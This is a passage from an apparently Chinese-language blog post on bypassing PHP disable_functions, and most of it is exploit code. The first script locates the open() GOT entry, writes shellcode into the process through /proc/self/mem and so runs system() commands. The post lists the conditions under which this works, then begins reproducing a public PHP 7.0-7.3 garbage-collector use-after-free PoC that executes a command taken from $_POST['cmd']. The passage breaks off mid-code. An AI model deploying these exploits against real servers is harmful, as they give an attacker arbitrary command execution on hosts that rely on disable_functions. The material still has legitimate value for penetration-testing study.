    <span class="hljs-keyword">case</span> SHT_SYMTAB:<br>                <span class="hljs-keyword">case</span> SHT_NOBITS:<br>                <span class="hljs-keyword">case</span> SHT_NOTE:<br>                <span class="hljs-keyword">case</span> SHT_FINI_ARRAY:<br>                <span class="hljs-keyword">case</span> SHT_INIT_ARRAY:<br>                <span class="hljs-keyword">case</span> SHT_GNU_versym:<br>                <span class="hljs-keyword">case</span> SHT_GNU_HASH:<br>                    <span class="hljs-keyword">break</span>;<br><br>                <span class="hljs-keyword">default</span>:<br>                    <span class="hljs-comment">//                   echo &quot;who knows what $sh_type this is? &quot;;</span><br><br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_reloc</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$rel_plts</span>=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$dynsym_section</span>= <span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);<br>        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-variable language_">$this</span>-&gt;rel_plt_section <span class="hljs-keyword">as</span> <span class="hljs-variable">$rel_plt</span> )&#123;<br>            <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_offset&#x27;</span>]+<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$rel_plt</span>[<span class="hljs-string">&#x27;rel_plt_entsize&#x27;</span>])<br>            &#123;<br>                <span class="hljs-variable">$rel_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">8</span>);<br>                <span class="hljs-variable">$rel_info</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>)&gt;&gt;<span class="hljs-number">32</span>;<br>                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$rel_info</span>*<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>],<span class="hljs-number">4</span>);<br>                <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]+<span class="hljs-variable">$fun_name_offset</span>-<span class="hljs-number">1</span>;<br>                <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>                <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>                    <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));<br>                &#125;<br>                <span class="hljs-variable">$rel_plts</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$rel_offset</span>;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;rel_plts=<span class="hljs-variable">$rel_plts</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get_shared_library</span>(<span class="hljs-params"><span class="hljs-variable">$elf_bin</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-variable">$elf_bin</span>)&#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">setElfBin</span>(<span class="hljs-variable">$elf_bin</span>);<br>        &#125;<br>        <span class="hljs-variable">$shared_librarys</span>=<span class="hljs-keyword">array</span>();<br>        <span class="hljs-variable">$dynsym_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;dynsym_section);<br>        <span class="hljs-variable">$strtab_section</span>=<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$this</span>-&gt;strtab_section);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span>=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>];<span class="hljs-variable">$i</span>&lt;<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_offset&#x27;</span>]+<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_size&#x27;</span>];<span class="hljs-variable">$i</span>+=<span class="hljs-variable">$dynsym_section</span>[<span class="hljs-string">&#x27;dynsym_entsize&#x27;</span>])<br>        &#123;<br>            <span class="hljs-variable">$shared_library_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>+<span class="hljs-number">8</span>,<span class="hljs-number">8</span>);<br>            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$i</span>,<span class="hljs-number">4</span>);<br>            <span class="hljs-variable">$fun_name_offset</span>=<span class="hljs-variable">$fun_name_offset</span>+<span class="hljs-variable">$strtab_section</span>[<span class="hljs-string">&#x27;strtab_offset&#x27;</span>]-<span class="hljs-number">1</span>;<br>            <span class="hljs-variable">$fun_name</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br>            <span class="hljs-keyword">while</span> (<span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(++<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>)!=<span class="hljs-string">&quot;&quot;</span>)&#123;<br>                <span class="hljs-variable">$fun_name</span>.=<span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$fun_name_offset</span>,<span class="hljs-number">1</span>));<br>            &#125;<br>            <span class="hljs-variable">$shared_librarys</span>[<span class="hljs-variable">$fun_name</span>]=<span class="hljs-variable">$shared_library_offset</span>;<br>        &#125;<br>        <span class="hljs-variable language_">$this</span>-&gt;shared_librarys=<span class="hljs-variable">$shared_librarys</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-title function_ invoke__">fclose</span>(<span class="hljs-variable">$this</span>-&gt;elf_bin);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">close</span>();<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">packlli</span>(<span class="hljs-params"><span class="hljs-variable">$value</span></span>) </span>&#123;<br>        <span class="hljs-variable">$higher</span> = (<span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0xffffffff00000000</span>) &gt;&gt; <span class="hljs-number">32</span>;<br>        <span class="hljs-variable">$lower</span> = <span class="hljs-variable">$value</span> &amp; <span class="hljs-number">0x00000000ffffffff</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">pack</span>(<span class="hljs-string">&#x27;V2&#x27;</span>, <span class="hljs-variable">$lower</span>, <span class="hljs-variable">$higher</span>);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-comment">// step1：拿到open函数的got表的地址</span><br><span class="hljs-variable">$test</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<br><span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-string">&#x27;/proc/self/exe&#x27;</span>); <span class="hljs-comment">//解析/proc/self/exe即当前程序</span><br><span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();  <span class="hljs-comment">//获得各函数的got表的地址</span><br><span class="hljs-variable">$open_php</span>=<span class="hljs-variable">$test</span>-&gt;rel_plts[<span class="hljs-string">&#x27;open&#x27;</span>];<br><br><br><span class="hljs-comment">// step2：拿到程序基地址，栈地址，libc地址</span><br><span class="hljs-variable">$maps</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;/proc/self/maps&#x27;</span>);<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+)\s+.+\[stack]/&#x27;</span>, <span class="hljs-variable">$maps</span>, <span class="hljs-variable">$stack</span>);<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/(\w+)-(\w+).*?libc-/&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libcgain</span>);<br><span class="hljs-variable">$libc_base</span> = <span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$libcgain</span>[<span class="hljs-number">1</span>];<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Libc base: &quot;</span>.<span class="hljs-variable">$libc_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Stack location: &quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>].<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-variable">$pie_base</span> = <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.(<span class="hljs-title function_ invoke__">explode</span>(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-variable">$maps</span>)[<span class="hljs-number">0</span>]));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;PIE base: &quot;</span>.<span class="hljs-variable">$pie_base</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><br><span class="hljs-comment">// step3：计算system的实际地址</span><br><span class="hljs-variable">$test2</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">elf</span>();<br><span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;#.*?(/.*libc-\d.\d\d.so)#&#x27;</span>,<span class="hljs-variable">$maps</span>,<span class="hljs-variable">$libc</span>); <span class="hljs-comment">// 匹配libc</span><br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_section</span>(<span class="hljs-variable">$libc</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_reloc</span>();<br><span class="hljs-variable">$test2</span>-&gt;<span class="hljs-title function_ invoke__">get_shared_library</span>(); <span class="hljs-comment">//获得libc中的各函数的地址</span><br><span class="hljs-variable">$sys</span> = <span class="hljs-variable">$test2</span>-&gt;shared_librarys[<span class="hljs-string">&#x27;system&#x27;</span>];  <span class="hljs-comment">//获取libc中system的偏移</span><br><span class="hljs-variable">$sys_addr</span> = <span class="hljs-variable">$sys</span> + <span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-variable">$libc_base</span>);  <span class="hljs-comment">//加上libc基地址获得system函数的实际地址</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;system addr: &quot;</span>.<span class="hljs-variable">$sys_addr</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><br><br><span class="hljs-comment">// step4：修改got表指向的地址</span><br><span class="hljs-variable">$mem</span> = <span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&#x27;/proc/self/mem&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>); <span class="hljs-comment">//修改该文件相当于直接修改当前进程的内存</span><br><span class="hljs-variable">$shellcode_loc</span> = <span class="hljs-variable">$pie_base</span> + <span class="hljs-number">0x2333</span>;  <span class="hljs-comment">//随便找一个存放shellcode的地址</span><br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$open_php</span>);  <span class="hljs-comment">//文件指针定位到open函数的got表的地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$shellcode_loc</span>)); <span class="hljs-comment">//向open函数的got表的地址写入我们shellcode的存放地址</span><br><br><br><span class="hljs-comment">// step5：写入命令到shellcode，并将shellcode写入到之前指定的地址中</span><br><span class="hljs-variable">$command</span>=<span class="hljs-string">&quot;ls &gt; /var/www/html/1.txt&quot;</span>;<br><span class="hljs-comment">//$command=$_GET[&#x27;cmd&#x27;];</span><br><span class="hljs-variable">$stack</span>=<span class="hljs-title function_ invoke__">hexdec</span>(<span class="hljs-string">&quot;0x&quot;</span>.<span class="hljs-variable">$stack</span>[<span class="hljs-number">1</span>]);<br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-variable">$stack</span>);  <span class="hljs-comment">//文件指针定位到栈地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>, <span class="hljs-string">&quot;<span class="hljs-subst">&#123;$command&#125;</span>\x00&quot;</span>);  <span class="hljs-comment">//向栈地址写入要执行的命令</span><br><span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$stack</span>;  <span class="hljs-comment">//$cmd变量的值即为要执行的命令的存放地址</span><br><span class="hljs-variable">$shellcode</span> = <span class="hljs-string">&quot;H\xbf&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$cmd</span>).<span class="hljs-string">&quot;H\xb8&quot;</span>.<span class="hljs-variable">$test</span>-&gt;<span class="hljs-title function_ invoke__">packlli</span>(<span class="hljs-variable">$sys_addr</span>).<span class="hljs-string">&quot;P\xc3&quot;</span>;<br><span class="hljs-title function_ invoke__">fseek</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode_loc</span>); <span class="hljs-comment">//文件指针定位到之前写入open函数got表的地址</span><br><span class="hljs-title function_ invoke__">fwrite</span>(<span class="hljs-variable">$mem</span>,<span class="hljs-variable">$shellcode</span>); <span class="hljs-comment">//向该地址写入处理好的shellcode</span><br><br><br><span class="hljs-comment">// step6：触发open函数</span><br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-string">&#x27;aaa&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>); <span class="hljs-comment">//通过readfile函数调用open函数，在跳转到got表指向的地址即进入我们的shellcode地址执行</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;DONE\n&quot;</span>;<br><span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure><p>其中的shellcode为</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">&gt;&gt;&gt; </span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-meta">&gt;&gt;&gt; </span>context.arch = <span class="hljs-string">&quot;amd64&quot;</span><br><span class="hljs-meta">&gt;&gt;&gt; </span>shellcode=<span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string"><span class="hljs-meta">... </span>mov rdi,0xffffffff</span><br><span class="hljs-string"><span class="hljs-meta">... </span>mov rax,0xffffffff</span><br><span class="hljs-string"><span class="hljs-meta">... </span>push rax</span><br><span class="hljs-string"><span class="hljs-meta">... </span>ret</span><br><span class="hljs-string"><span class="hljs-meta">... </span>&#x27;&#x27;&#x27;</span><br>&gt;&gt;&gt;<br><span class="hljs-meta">&gt;&gt;&gt; </span>asm(shellcode)<br><span class="hljs-string">b&#x27;H\xbf\xff\xff\xff\xff\x00\x00\x00\x00H\xb8\xff\xff\xff\xff\x00\x00\x00\x00P\xc3&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>利用条件</strong></p><ul><li>&#x2F;proc&#x2F;self&#x2F;mem 可读写</li><li>Linux 内核版本 &gt;&#x3D; 2.98</li><li>PHP-CGI 或 PHP-FPM 启动</li></ul><p>apache+php 由于 apache 调用 setuid 设置 www-data 权限工作进程，&#x2F;proc&#x2F;self&#x2F;mem 属于 www-data 且权限是600，&#x2F;proc&#x2F;self&#x2F; 目录属于root用户，导致没有权限读写</p><p>但是对于 Nginx+php ，且为低版本的 php-fpm（PHP&lt;5.6），&#x2F;proc&#x2F;self&#x2F;属于 www-data ，可以通过写入GOT表来实现RCE</p><blockquote><p>注：我在实际利用中并没有成功</p></blockquote><h1 id="利用UAF-Bypass"><a href="#利用UAF-Bypass" class="headerlink" title="利用UAF Bypass"></a>利用UAF Bypass</h1><p>各种利用二进制漏洞去攻击的手法<br>原理就不细说了，也不太懂pwn，放链接了</p><h2 id="php7-GC-UAF（PHP-7-0-7-3）"><a href="#php7-GC-UAF（PHP-7-0-7-3）" class="headerlink" title="php7_GC_UAF（PHP 7.0-7.3）"></a>php7_GC_UAF（PHP 7.0-7.3）</h2><p><strong>利用条件</strong></p><ul><li>Linux 操作系统</li><li>PHP7.0 - all versions to date</li><li>PHP7.1 - all versions to date</li><li>PHP7.2 - all versions to date</li><li>PHP7.3 - all versions to date</li></ul><p><strong>原理</strong></p><p>通过PHP垃圾收集器中堆溢出来绕过 disable_functions 并执行系统命令</p><p><a href="http://3xp10it.cc/%E4%BA%8C%E8%BF%9B%E5%88%B6/2017/04/19/PHP%E4%B8%AD%E7%9A%84%E5%86%85%E5%AD%98%E7%A0%B4%E5%9D%8F%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0(1st)/">PHP中的内存破坏漏洞利用学习(1st)</a></p><p><strong>exp</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-comment"># PHP 7.0-7.3 disable_functions bypass PoC (*nix only)</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Bug: https://bugs.php.net/bug.php?id=72530</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># This exploit should work on all PHP 7.0-7.3 versions</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Author: https://github.com/mm0r1</span><br><br><span class="hljs-comment">//pwn(&quot;uname -a&quot;);</span><br><span class="hljs-title function_ invoke__">pwn</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123;<br>    <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">str2ptr</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$address</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$j</span> = <span class="hljs-variable">$s</span>-<span class="hljs-number">1</span>; <span class="hljs-variable">$j</span> &gt;= <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span>--) &#123;<br>            <span class="hljs-variable">$address</span> &lt;&lt;= <span class="hljs-number">8</span>;<br>            <span class="hljs-variable">$address</span> |= <span class="hljs-title function_ invoke__">ord</span>(<span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span>+<span class="hljs-variable">$j</span>]);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$address</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">ptr2str</span>(<span class="hljs-params"><span class="hljs-variable">$ptr</span>, <span class="hljs-variable">$m</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;&quot;</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$m</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$out</span> .= <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$ptr</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$ptr</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$out</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">write</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$str</span>, <span class="hljs-variable">$p</span>, <span class="hljs-variable">$v</span>, <span class="hljs-variable">$n</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-variable">$n</span>; <span class="hljs-variable">$i</span>++) &#123;<br>            <span class="hljs-variable">$str</span>[<span class="hljs-variable">$p</span> + <span class="hljs-variable">$i</span>] = <span class="hljs-title function_ invoke__">chr</span>(<span class="hljs-variable">$v</span> &amp; <span class="hljs-number">0xff</span>);<br>            <span class="hljs-variable">$v</span> &gt;&gt;= <span class="hljs-number">8</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">leak</span>(<span class="hljs-params"><span class="hljs-variable">$addr</span>, <span class="hljs-variable">$p</span> = <span class="hljs-number">0</span>, <span class="hljs-variable">$s</span> = <span class="hljs-number">8</span></span>) </span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$abc</span>, <span class="hljs-variable">$helper</span>;<br>        <span class="hljs-title function_ invoke__">write</span>(<span class="hljs-variable">$abc</span>, <span class="hljs-number">0x68</span>, <span class="hljs-variable">$addr</span> + <span class="hljs-variable">$p</span> - <span class="hljs-number">0x10</span>);<br>        <span class="hljs-variable">$leak</span> = <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$helper</span>-&gt;a);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$s</span> != <span class="hljs-number">8</span>) &#123; <span class="hljs-variable">$leak</span> %= <span class="hljs-number">2</span> &lt;&lt; (<span class="hljs-variable">$s</span> * <span class="hljs-number">8</span>) - <span class="hljs-number">1</span>; &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$leak</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parse_elf</span>(<span class="hljs-params"><span class="hljs-variable">$base</span></span>) </span>&#123;<br>        <span class="hljs-variable">$e_type</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">2</span>);<br><br>        <span class="hljs-variable">$e_phoff</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x20</span>);<br>        <span class="hljs-variable">$e_phentsize</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">2</span>);<br>        <span class="hljs-variable">$e_phnum</span> = <span class="hljs-title function_ invoke__">leak</span>(<span class="hljs-variable">$base</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">2</span>);<br><br>        <span 